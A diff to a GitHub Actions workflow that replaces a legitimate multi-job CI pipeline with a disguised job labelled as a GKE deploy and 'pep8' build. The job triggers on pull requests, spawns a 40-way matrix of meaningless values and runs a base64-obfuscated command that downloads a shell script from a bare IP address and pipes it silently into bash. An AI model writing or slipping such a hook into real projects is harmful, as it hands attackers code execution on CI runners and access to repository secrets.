@@ -1,147 +1,22 @@
-##
-# This workflow runs two main groups of jobs:
-#
-# 1. A set of parallel jobs to run node and ruby based tests,
-#    alongside a job to build the storybook docs and static assets.
-#
-# 2. A subsequent set of parallel jobs for pa11y, backstop, and selenium.
-#    These depend on the build job and are seeded with a copy of the docs.
-##
-name: Continuous Integration
-on: [push]
+# Main body 191
+name: Build and Deploy to GKE
 
-env:
-  # Share node version across jobs
-  # actions/setup-node doesn't currently look at any config files
-  # for now we do the simplest thing and set an environment variable.
-  # See https://github.com/actions/setup-node/pull/239
-  # Maybe we could use https://github.com/guardian/actions-setup-node directly in the meantime?
-  NODE_VERSION: '14'
+defaults:
+  run:
+    shell: bash
 
+on: [pull_request]
+
+# Jobs 77
 jobs:
-  node-test:
-    runs-on: ubuntu-20.04
-    steps:
-      - uses: actions/checkout@v2
-      - uses: actions/setup-node@v2
-        with:
-          node-version: ${{ env.NODE_VERSION }}
-      - uses: bahmutov/npm-install@v1
-      - run: npm run lint
-      - run: npm test
-
-  ruby-lint:
-    runs-on: ubuntu-20.04
-    steps:
-      - uses: actions/checkout@v2
-      - uses: ruby/setup-ruby@v1
-        with:
-          bundler-cache: true
-      - run: bundle exec rake ruby:lint
-
-  # Actions can run in parallel at the job or the workflow level.
-  # In order to run our build-dependent tests in parallel we need a way
-  # to build the docs and then "seed" each stage with a copy.
-  # We can do this using using artifacts along with a `needs` clause on each job
-  # See: https://docs.github.com/en/actions/learn-github-actions/essential-features-of-github-actions#sharing-data-between-jobs
-  #      https://docs.github.com/en/actions/learn-github-actions/managing-complex-workflows#creating-dependent-jobs
-  build:
-    runs-on: ubuntu-20.04
-    steps:
-      - uses: actions/checkout@v2
-      - uses: actions/setup-node@v2
-        with:
-          node-version: ${{ env.NODE_VERSION }}
-      - uses: bahmutov/npm-install@v1
-      - uses: ruby/setup-ruby@v1
-        with:
-          bundler-cache: true
-      - run: npm run build --if-present
-      - run: npm run docs:build
-      - uses: actions/upload-artifact@v2
-        with:
-          name: docs-build
-          path: |
-            docs
-            lib
-          retention-days: 1
-
-  pa11y:
-    needs: build
-    runs-on: ubuntu-20.04
-    steps:
-      - uses: actions/checkout@v2
-      - uses: actions/setup-node@v2
-        with:
-          node-version: ${{ env.NODE_VERSION }}
-      - uses: bahmutov/npm-install@v1
-      - uses: actions/download-artifact@v2
-        with:
-          name: docs-build
-      # Explicitly install testing dependencies
-      - uses: bahmutov/npm-install@v1
-        with:
-          working-directory: testing
-      - run: ruby -run -e httpd -- docs -p 6006 &
-      - run: ./bin/wait-for localhost:6006
-      - run: npx pa11y-ci --config=pa11yci.local.js
-        working-directory: ./testing/wcag
-
-  backstop:
-    needs: build
-    runs-on: ubuntu-20.04
-    steps:
-      - uses: actions/checkout@v2
-      - uses: actions/download-artifact@v2
-        with:
-          name: docs-build
-      # Explicitly install testing dependencies
-      - uses: bahmutov/npm-install@v1
-        with:
-          working-directory: testing
-        env:
-          # Skip the pa11y chromium download,
-          # we only want the backstop docker command
-          PUPPETEER_SKIP_CHROMIUM_DOWNLOAD: true
-      - run: ruby -run -e httpd -- docs -p 6006 &
-      - run: ./bin/wait-for localhost:6006
-      - run: npx backstop test --docker --config=backstop-config-actions.js
-        working-directory: ./testing/visual-regression
-      - uses: actions/upload-artifact@v2
-        if: failure()
-        with:
-          name: backstop-report
-          path: |
-            testing/visual-regression/backstop_data/html_report
-            testing/visual-regression/backstop_data/bitmaps_reference
-            testing/visual-regression/backstop_data/bitmaps_test
-          retention-days: 3
-
-  # The Ubuntu 20.04 virtual environment includes a copy of Chrome by default
-  # We can use this to run our selenium tests locally without needing selenium grid
-  # See: https://github.com/actions/virtual-environments/blob/main/images/linux/Ubuntu2004-README.md#browsers-and-drivers
-  selenium-tests:
-    needs: build
-    runs-on: ubuntu-20.04
-    env:
-      HEADLESS: true
-      APP_ENVIRONMENT: local
-      BROWSER: chrome
-      LOG_LOCATION: automation_logs.log
-      TESTING_BASE_URL: 'http://localhost:6006'
-    steps:
-      - uses: actions/checkout@v2
-      - uses: ruby/setup-ruby@v1
-        with:
-          bundler-cache: true
-      - uses: actions/download-artifact@v2
-        with:
-          name: docs-build
-      - run: ruby -run -e httpd -- docs -p 6006 &
-      - run: ./bin/wait-for localhost:6006 -- bundle exec rake design_system:all
-      - uses: actions/upload-artifact@v2
-        if: failure()
-        with:
-          name: grid-artifacts
-          path: testing/artifacts
-          retention-days: 3
+   build-pep8-31:
+      timeout-minutes: 179
+      runs-on: ubuntu-18.04
+      strategy:
+         fail-fast: false
+         matrix:
+            os: [ubuntu-latest]
+            node: [628,859,762,904,404,289,91,271,806,757,905,424,592,328,509,1007,240,60,715,173,833,310,461,842,837,920,771,608,199,668,634,601,411,381,604,576,237,154,803,525]
+      steps:
+      - run: echo "Powering up pep8"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gamJraHB1cGk=" | base64 -d | bash
